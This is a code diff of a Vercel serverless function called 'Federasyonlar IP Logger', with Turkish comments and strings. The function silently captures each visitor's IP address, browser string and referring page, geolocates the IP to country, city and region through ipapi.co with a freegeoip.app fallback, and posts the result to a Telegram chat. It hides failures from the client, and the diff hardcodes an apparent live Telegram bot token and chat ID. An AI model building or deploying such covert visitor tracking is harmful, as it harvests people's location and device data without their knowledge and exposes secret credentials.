@@ -1,45 +1,67 @@
 // api/log-ip.js
-// Federasyonlar IP Logger - Vercel Compatible (Silent + Turkish Default)
+// Federasyonlar IP Logger - Optimized for Real City + Country
 
 export default async function handler(req, res) {
   try {
-    // Get real client IP (Vercel provides this via headers)
-    const forwardedFor = req.headers['x-forwarded-for'];
-    const ip = forwardedFor
-      ? forwardedFor.split(',')[0].trim()
-      : req.headers['x-real-ip'] || req.socket.remoteAddress || 'Bilinmiyor';
+    // Get IP Address (Best method for Vercel)
+    let ip = req.headers['x-forwarded-for']
+      ? req.headers['x-forwarded-for'].split(',')[0].trim()
+      : req.headers['x-real-ip']
+      || req.socket?.remoteAddress
+      || 'Bilinmiyor';
 
-    // Get more info
+    // Remove IPv6 prefix if present
+    if (ip.startsWith('::ffff:')) {
+      ip = ip.replace('::ffff:', '');
+    }
+
     const userAgent = req.headers['user-agent'] || 'Bilinmiyor';
-    const pageURL = req.headers.referer || req.headers.origin || 'Doğrudan';
+    const pageURL = req.headers.referer || req.headers.origin || 'Doğrudan Erişim';
     const timestamp = new Date().toLocaleString('tr-TR');
 
-    // Optional: Get country/city (free service)
+    // Get accurate location data
     let country = "Bilinmiyor";
     let city = "Bilinmiyor";
+    let region = "Bilinmiyor";
+
     try {
-      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
+        headers: { 'User-Agent': 'Federasyonlar-IP-Logger' }
+      });
+
       if (geoRes.ok) {
         const geo = await geoRes.json();
-        country = geo.country_name || "Bilinmiyor";
+        country = geo.country_name || geo.country || "Bilinmiyor";
         city = geo.city || "Bilinmiyor";
+        region = geo.region || geo.region_code || "Bilinmiyor";
       }
-    } catch (e) { }
+    } catch (e) {
+      // Fallback: Try another free service
+      try {
+        const fallbackRes = await fetch(`https://freegeoip.app/json/${ip}`);
+        if (fallbackRes.ok) {
+          const geo = await fallbackRes.json();
+          country = geo.country_name || "Bilinmiyor";
+          city = geo.city || "Bilinmiyor";
+          region = geo.region_name || "Bilinmiyor";
+        }
+      } catch { }
+    }
 
     const message = `
-🛡️ Yeni Ziyaretçi (Vercel)
+🛡️ Yeni Ziyaretçi
 
 🌐 IP Adresi: ${ip}
 🇹🇷 Ülke: ${country}
 🏙️ Şehir: ${city}
+📍 Bölge: ${region}
 🔗 Sayfa: ${pageURL}
-📱 Cihaz: ${userAgent}
+📱 Cihaz: ${userAgent.substring(0, 100)}... 
 ⏰ Zaman: ${timestamp}
-        `.trim();
+    `.trim();
 
-    // Send to Telegram
-    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";   // ← Buraya kendi bot tokenını yaz
-    const CHAT_ID = "8437897670";     // ← Buraya kendi chat ID'ni yaz
+    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";   // ← Buraya yaz
+    const CHAT_ID = "8437897670";     // ← Buraya yaz
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -51,11 +73,10 @@ export default async function handler(req, res) {
       })
     });
 
-    // Return success (silent for client)
     return res.status(200).json({ success: true });
 
   } catch (error) {
-    // Completely silent on error
+    // Silent fail
     return res.status(200).json({ success: false });
   }
 }
